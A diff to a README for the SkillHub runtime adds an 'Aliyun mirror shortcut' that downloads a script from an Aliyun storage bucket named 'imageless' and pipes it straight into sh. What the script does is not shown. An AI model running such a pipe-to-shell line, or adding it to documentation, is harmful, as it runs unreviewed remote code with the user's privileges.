@@ -137,6 +137,12 @@ Recommended image tags:
 - `SKILLHUB_VERSION=edge` for the latest `main` build
 - `SKILLHUB_VERSION=vX.Y.Z` for a fixed release
 
+Use the bundled Aliyun mirror shortcut when a nearer registry is configured:
+
+```bash
+curl -fsSL https://imageless.oss-cn-beijing.aliyuncs.com/runtime.sh | sh -s -- up --aliyun --version edge
+```
+
 Start the runtime:
 
 ```bash
